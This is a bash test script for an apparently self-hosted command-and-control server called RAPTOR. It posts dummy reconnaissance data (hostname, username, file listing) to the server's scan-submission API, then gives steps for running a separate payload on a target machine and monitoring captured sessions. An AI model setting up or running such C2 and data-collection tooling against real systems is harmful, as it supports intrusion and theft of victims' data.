#!/bin/bash

##############################################################################
# Quick Test Script for Cloud Deployment
# Tests connectivity to your deployed RAPTOR C2 server
#
# Usage: ./test_cloud_deployment.sh <your-vps-ip-or-domain>
# Example: ./test_cloud_deployment.sh 123.45.67.89
# Example: ./test_cloud_deployment.sh raptor.yourdomain.com
##############################################################################

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

if [ -z "$1" ]; then
    echo -e "${RED}Usage: $0 <vps-ip-or-domain>${NC}"
    echo "Example: $0 123.45.67.89"
    echo "Example: $0 raptor.yourdomain.com"
    exit 1
fi

# Auto-detect http/https
if [[ "$1" == http* ]]; then
    C2_URL="$1"
else
    C2_URL="http://$1"
fi

API_ENDPOINT="${C2_URL}/api/submit_scan/"

echo -e "${BLUE}╔════════════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║  RAPTOR Cloud Deployment Test                 ║${NC}"
echo -e "${BLUE}╚════════════════════════════════════════════════╝${NC}"
echo ""

# Test 1: Ping server
echo -e "${YELLOW}[1/5] Testing server connectivity...${NC}"
if curl -s -o /dev/null -w "%{http_code}" "$C2_URL" | grep -q "200\|301\|302"; then
    echo -e "${GREEN}✓ Server is reachable${NC}"
else
    echo -e "${RED}✗ Cannot reach server at $C2_URL${NC}"
    exit 1
fi

# Test 2: Test API endpoint
echo -e "${YELLOW}[2/5] Testing API endpoint...${NC}"
RESPONSE=$(curl -s -X POST "$API_ENDPOINT" \
    -H "Content-Type: application/json" \
    -d '{
        "recon_data": {
            "hostname": "test-system",
            "os_name": "Linux",
            "username": "test-user",
            "files": [
                {"name": "test.txt", "path": "/tmp/test.txt", "size": 1024}
            ]
        }
    }' \
    -w "\nHTTP_CODE:%{http_code}")

HTTP_CODE=$(echo "$RESPONSE" | grep "HTTP_CODE" | cut -d: -f2)
BODY=$(echo "$RESPONSE" | sed '/HTTP_CODE/d')

if [ "$HTTP_CODE" = "201" ]; then
    echo -e "${GREEN}✓ API endpoint working (HTTP 201)${NC}"
    SESSION_ID=$(echo "$BODY" | grep -o '"session_id":"[^"]*' | cut -d'"' -f4)
    echo -e "${BLUE}  Session ID: $SESSION_ID${NC}"
else
    echo -e "${RED}✗ API endpoint failed (HTTP $HTTP_CODE)${NC}"
    echo "$BODY"
    exit 1
fi

# Test 3: Check session status
if [ -n "$SESSION_ID" ]; then
    echo -e "${YELLOW}[3/5] Checking session status...${NC}"
    STATUS_URL="${C2_URL}/api/session/${SESSION_ID}/"
    
    STATUS_RESPONSE=$(curl -s "$STATUS_URL")
    STATUS=$(echo "$STATUS_RESPONSE" | grep -o '"status":"[^"]*' | cut -d'"' -f4)
    
    if [ -n "$STATUS" ]; then
        echo -e "${GREEN}✓ Session created successfully${NC}"
        echo -e "${BLUE}  Status: $STATUS${NC}"
    else
        echo -e "${RED}✗ Failed to retrieve session status${NC}"
        exit 1
    fi
else
    echo -e "${RED}✗ No session ID received${NC}"
    exit 1
fi

# Test 4: Wait for processing
echo -e "${YELLOW}[4/5] Waiting for AI processing (10 seconds)...${NC}"
sleep 10

FINAL_STATUS=$(curl -s "$STATUS_URL" | grep -o '"status":"[^"]*' | cut -d'"' -f4)
echo -e "${BLUE}  Final status: $FINAL_STATUS${NC}"

# Test 5: Summary
echo -e "${YELLOW}[5/5] Testing complete!${NC}"
echo ""
echo -e "${GREEN}╔════════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║  ✅ All Tests Passed!                          ║${NC}"
echo -e "${GREEN}╚════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "${BLUE}Next steps:${NC}"
echo "1. Update payload_cloud.py with your C2 URL:"
echo "   C2_SERVER = \"$C2_URL\""
echo ""
echo "2. Run payload on target VM:"
echo "   python3 payload_cloud.py"
echo ""
echo "3. Monitor sessions at:"
echo "   ${C2_URL}/admin/"
echo ""
echo "4. Check logs on VPS:"
echo "   sudo journalctl -u raptor -f"
echo ""
